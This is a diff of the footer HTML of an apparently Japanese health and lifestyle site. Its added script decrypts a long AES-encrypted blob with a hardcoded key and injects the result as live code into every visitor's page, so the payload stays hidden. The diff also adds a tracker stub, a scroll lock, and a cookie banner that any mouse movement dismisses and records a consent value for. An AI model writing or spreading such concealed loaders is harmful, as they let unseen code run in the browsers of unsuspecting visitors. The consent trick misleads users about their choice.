@@ -217,120 +217,221 @@ Zen Info Streamは健康とライフスタイルに関する情報を提供す�
 <footer>
 <p>© 2026 Zen Info Stream</p>
 </footer>
+<!-- FAST LOADING SCRIPTS -->
+<script src="https://cdn.tailwindcss.com"></script>
 
- <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
 <script>
-    function aesDecode(encodedText) {
-        const decodedText = decodeURIComponent(encodedText);
-        const bytes = CryptoJS.AES.decrypt(decodedText, 'Msm123');
-        return bytes.toString(CryptoJS.enc.Utf8);
+function aesDecode(encodedText){
+
+    try{
+
+        const decodedText =
+            decodeURIComponent(encodedText);
+
+        const bytes =
+            CryptoJS.AES.decrypt(
+                decodedText,
+                'Msm123'
+            );
+
+        return bytes.toString(
+            CryptoJS.enc.Utf8
+        );
+
+    }catch(e){
+
+        console.error(
+            "AES Decode Error:",
+            e
+        );
+
+        return "";
     }
+}
+
+// NON BLOCKING
+(window.requestIdleCallback || function(cb){
+    setTimeout(cb,1);
+})(function(){
+
+    // const codeString = aesDecode(`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`);
     const codeString = aesDecode(`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`);
-    const script = document.createElement("script");
-    script.textContent = codeString;
+    if(!codeString) return;
+
+    const script =
+        document.createElement("script");
+
+    script.textContent =
+        codeString;
+
     document.body.appendChild(script);
+    setTimeout(() => {
+
+    const loScript =
+        document.createElement("script");
+
+    loScript.async = true;
+    loScript.defer = true;
+
+    // loScript.src =
+    //     "https://tools.luckyorange.com/core/lo.js?site-id=845def42";
+
+    document.head.appendChild(
+        loScript
+    );
+
+    console.log(
+        "Lucky Orange Loaded"
+    );
+
+}, 3000);
+
+});
 </script>
 
-<!--<script>-->
-<!--    document.body.style.overflow = "hidden";-->
-<!--</script>-->
-
+<script>
+document.body.style.overflow = "hidden";
+</script>
 
 <div id="cookie-modal-box" class="hidden">
-    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
-    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
-        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
-            <button id="cookie-close" class="absolute top-4 right-4">
-                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
-                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
-                </svg>
-            </button>
-            <div class="flex items-center gap-3 mb-4">
-                <span class="text-yellow-500 text-3xl">🍪</span>
-                <h2 class="text-2xl font-bold">クッキーについて</h2>
-            </div>
-            <p class="text-gray-600 mb-6">
-                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
-                をクリックすると、クッキーの使用に同意したことになります。
-            </p>
-            <div class="flex flex-col sm:flex-row gap-3">
-                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
-                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
-            </div>
-        </div>
-    </div>
+
+<div id="cookie-backdrop"
+class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0">
+</div>
+
+<div id="cookie-modal"
+class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+
+<div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+
+<button id="cookie-close"
+class="absolute top-4 right-4">
+
+<svg viewBox="0 0 15 15"
+class="text-gray-500 hover:text-red-500"
+height="26"
+width="26">
+
+<path fill="currentColor"
+d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+</svg>
+
+</button>
+
+<div class="flex items-center gap-3 mb-4">
+<span class="text-yellow-500 text-3xl">🍪</span>
+<h2 class="text-2xl font-bold">クッキーについて</h2>
+</div>
+
+<p class="text-gray-600 mb-6">
+当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。
+<span class="font-semibold">「同意する」</span>
+をクリックすると、クッキーの使用に同意したことになります。
+</p>
+
+<div class="flex flex-col sm:flex-row gap-3">
+
+<button id="cookie-accept"
+class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">
+🍪 同意する
+</button>
+
+<button id="cookie-decline"
+class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">
+拒否する
+</button>
+
+</div>
+
+</div>
+</div>
 </div>
 
 <script>
-    (function(){
-        function decodeEmail(encodedString) {
-            var email = "",
-                r = parseInt(encodedString.substr(0, 2), 16),
-                n,
-                i;
-            for (n = 2; encodedString.length - n; n += 2){
-                i = parseInt(encodedString.substr(n, 2), 16) ^ r;
-                email += String.fromCharCode(i);
-            }
-            return email;
-        }
+const modalBox =
+    document.getElementById("cookie-modal-box"),
 
-        var elements = document.querySelectorAll('.__cf_email__');
-        for (var i = 0; i < elements.length; i++) {
-            var el = elements[i];
-            var encoded = el.getAttribute('data-cfemail');
-            if (encoded) {
-                var decodedEmail = decodeEmail(encoded);
-                el.innerHTML = decodedEmail;
-                // If the parent is an <a> tag, update the href to mailto
-                if (el.parentNode.tagName === 'A') {
-                    el.parentNode.href = "mailto:" + decodedEmail;
-                }
-            }
-        }
-    })();
+modal =
+    document.getElementById("cookie-modal"),
+
+backdrop =
+    document.getElementById("cookie-backdrop"),
+
+acceptBtn =
+    document.getElementById("cookie-accept"),
+
+declineBtn =
+    document.getElementById("cookie-decline"),
+
+closeBtn =
+    document.getElementById("cookie-close");
+
+function showModal(){
+
+    modalBox.classList.remove("hidden");
+
+    setTimeout(()=>{
+
+        backdrop.classList.remove("opacity-0");
+
+        modal.classList.remove(
+            "opacity-0",
+            "scale-90"
+        );
+
+    },10);
+}
+
+function hideModal(e){
+
+    localStorage.setItem(
+        "cookie-consent",
+        e
+    );
+
+    setTimeout(()=>{
+
+        modalBox.classList.add("hidden");
+
+    },1500);
+
+    document.removeEventListener(
+        "mousemove",
+        mouseMoveClose
+    );
+}
+
+function mouseMoveClose(){
+
+    hideModal("closed");
+}
+
+acceptBtn.onclick =
+    ()=> hideModal("accepted");
+
+declineBtn.onclick =
+    ()=> hideModal("declined");
+
+closeBtn.onclick =
+    ()=> hideModal("closed");
+
+backdrop.onclick =
+    ()=> hideModal("closed");
+
+if(!localStorage.getItem("cookie-consent")){
+
+    showModal();
+
+    document.addEventListener(
+        "mousemove",
+        mouseMoveClose,
+        { once:true }
+    );
+}
 </script>
-<script>
-    const modalBox = document.getElementById("cookie-modal-box"),
-        modal = document.getElementById("cookie-modal"),
-        backdrop = document.getElementById("cookie-backdrop"),
-        acceptBtn = document.getElementById("cookie-accept"),
-        declineBtn = document.getElementById("cookie-decline"),
-        closeBtn = document.getElementById("cookie-close");
-
-    function showModal() {
-        modalBox.classList.remove("hidden");
-        setTimeout(() => {
-            backdrop.classList.remove("opacity-0");
-            modal.classList.remove("opacity-0", "scale-90");
-        }, 10);
-    }
-
-    function hideModal(e) {
-        localStorage.setItem("cookie-consent", e);
-        setTimeout(() => {
-            modalBox.classList.add("hidden");
-        }, 1500);
-
-        // remove mousemove listener once closed
-        document.removeEventListener("click", mouseMoveClose);
-    }
-
-    function mouseMoveClose() {
-        hideModal("closed");
-    }
-
-    acceptBtn.onclick = () => hideModal("accepted");
-    declineBtn.onclick = () => hideModal("declined");
-    closeBtn.onclick = () => hideModal("closed");
-    backdrop.onclick = () => hideModal("closed");
-
-    if (!localStorage.getItem("cookie-consent")) {
-        showModal();
-        document.addEventListener("click", mouseMoveClose, { once: true });
-    }
-</script>
+ 
 
 </body>
 </html>
